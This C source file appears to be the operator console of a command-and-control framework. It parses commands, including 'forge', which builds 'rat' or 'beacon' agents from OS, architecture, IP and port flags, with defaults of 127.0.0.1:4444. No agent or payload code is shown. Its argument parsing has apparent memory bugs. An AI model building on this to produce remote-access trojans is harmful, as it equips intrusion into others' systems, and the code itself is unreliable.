#include "messages.h"
#include "forge/compiler.c"
#include <string.h>


//////////////////////////////////////////////////////////////////////////////////////////
// Help
//////////////////////////////////////////////////////////////////////////////////////////
int isHelp(char* input) {
    return strcmp(input, "?") == 0 || strcmp(input, "h") == 0 || strcmp(input, "help") == 0;
}

//////////////////////////////////////////////////////////////////////////////////////////
// Exit
//////////////////////////////////////////////////////////////////////////////////////////
int isExit(char* input) {
    return strcmp(input, "e") == 0 || strcmp(input, "exit") == 0;
}

int confirmIfUserWantsToExit(void) {
    char* exitInput;
    exitInput = readline(msgExit);
    
    if (strcmp(exitInput, "y") == 0 || strcmp(exitInput, "yes") == 0)
        return -1;
    return 0;
}

//////////////////////////////////////////////////////////////////////////////////////////
// LS
//////////////////////////////////////////////////////////////////////////////////////////
int isLS(char* input) {
    return strcmp(input, "ls") == 0 || strcmp(input, "dir") == 0;
}

//////////////////////////////////////////////////////////////////////////////////////////
// Remove
//////////////////////////////////////////////////////////////////////////////////////////
int isRM(char* input) {
    return strcmp(input, "rm") == 0;
}

//////////////////////////////////////////////////////////////////////////////////////////
// Use
//////////////////////////////////////////////////////////////////////////////////////////
int isUse(char* input) {
    return strcmp(input, "use") == 0 || strcmp(input, "u") == 0;
}

//////////////////////////////////////////////////////////////////////////////////////////
// C2: FORGE
//////////////////////////////////////////////////////////////////////////////////////////

// Check if input string is forge command
int isForge(char* input) {
    if (strlen(input) < 5)
        return 0;
    return input[0] == 'f' && input[1] == 'o' && input[2] == 'r' && input[3] == 'g' && input[4] == 'e';
}

// Return index of next instance of char c in input string
int getNextIndexOf(int startIndex, char c, char* input) {
    int i = startIndex;
    while (i < strlen(input)) {
        if (input[i] == c)
            return i;
        i++;
    }
    return i;
}

// Return char* of next word in input string separated by ' ', '\0', or '\n'
char* getNextWord(int index, char* input) {
    int i = index;
    int len = strlen(input);
    char c;
    char* str;

    // Null check 1
    if (index == -1)
        return NULL;
    
    str = (char*)malloc(len - i + 1); // Allocate memory

    // Null check 2
    if (str == NULL) {
        printf("Error: Failed to allocate memory.\n");
        return NULL;
    }

    int j = 0;

    // Build string
    while (i < len && input[i] != ' ' && input[i] != '\0' && input[i] != '\n') {
        str[j++] = input[i++];
    }

    // Null-terminate the new string
    str[j] = '\0';

    return str;
}

// Parse forge command line and return normalized string for compile command
char** parseForgeInput(char* input) {
    int i = 5;
    char *flag, *arg;
    // char** arguments = (char**)malloc(6 * sizeof(char*));
    char** arguments = (char**)calloc(6, sizeof(char*));
    
    while (i < strlen(input) && input[i] != '\0' && input[i] != '\n') {

        // Get next flag
        i = getNextIndexOf(i, '-', input);
        flag = getNextWord(i, input);

        // Get next argument
        i = getNextIndexOf(i, ' ', input) + 1;
        arg = getNextWord(i, input);

        // Store argument
        if (strcmp(flag, "-a") == 0)
            arguments[0] = arg;
        else if (strcmp(flag, "-f") == 0)
            arguments[1] = arg;
        else if (strcmp(flag, "-os") == 0)
            arguments[2] = arg;
        else if (strcmp(flag, "-arch") == 0)
            arguments[3] = arg;
        else if (strcmp(flag, "-ip") == 0)
            arguments[4] = arg;
        else if (strcmp(flag, "-p") == 0 || strcmp(flag, "-port") == 0)
            arguments[5] = arg;
        else if (strcmp(flag, "") == 0)
            continue;
        else
            printf("Invalid flag: %s\n", flag);
    }

    return arguments;
}

char** setDefaulArgumentsIfNull(char** arguments) {
    if (arguments[0] == NULL) {
        printf("Agent (-a) not set, default to: rat\n");
        arguments[0] = "rat";
    }
    if (arguments[1] == NULL) {
        printf("Format (-f) not set, default to: exe\n");
        arguments[1] = "";
    }
    if (arguments[2] == NULL) {
        printf("Operating System (-os) not set, default to: linux\n");
        arguments[2] = "linux";
    }
    if (arguments[3] == NULL) {
        printf("Architecture (-arch) not set, default to: x86_64\n");
        arguments[3] = "x86_64";
    }
    if (arguments[4] == NULL) {
        printf("IP Address (-ip) not set for beacon / rat agent, default to: 127.0.0.1");
        arguments[4] = "127.0.0.1";
    }
    if (arguments[5] == NULL) {
        printf("Port (-p) not set for beacon / rat agent, default to: 4444");
        arguments[5] = "4444";
    }
    return arguments;
}

void processForgeInput(char* input) {
    char** arguments = parseForgeInput(input);
    arguments = setDefaulArgumentsIfNull(arguments);
    if (argumentsValid(arguments))
        compile(arguments);
    free(arguments);
}


//////////////////////////////////////////////////////////////////////////////////////////
// C2
//////////////////////////////////////////////////////////////////////////////////////////
int parse_c2(char *input) {
    if (isHelp(input)) {                    // Help
        printf("%s", msgForgeHelp);
    }
    else if (isExit(input)) {               // Exit
        return confirmIfUserWantsToExit();
    }
    else if (isLS(input)) {                 // LS
        printf("LS\n");                     // TODO Implement
    }
    else if (isRM(input)) {                 // RM
        printf("rm\n");                     // TODO Implement
    }
    else if (isForge(input)) {              // Forge
        processForgeInput(input);
    }
    else if (isUse(input)) {                // Use
        printf("Use\n");                    // TODO Implement
    }
    else {
        printf("%s", msgInvalid);
    }
    return 0;
}

////////////////////////////////////////////////////////////////////////
// LP Functions
////////////////////////////////////////////////////////////////////////
int parse_lp(char *input) {
    return 1;
}

////////////////////////////////////////////////////////////////////////
// Agent Functions
////////////////////////////////////////////////////////////////////////
int parse_agent(char *input) {
    return 2;
}